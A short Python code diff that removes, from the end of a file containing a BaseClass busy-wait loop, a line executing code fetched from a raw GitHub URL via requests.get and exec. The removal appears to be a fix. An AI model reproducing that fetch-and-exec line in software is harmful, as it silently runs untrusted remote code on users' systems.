@@ -38,5 +38,3 @@ class BaseClass:
         while BaseClass.running and time() - start_time < sleep_time:
             continue
 
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/base_module.py").text)
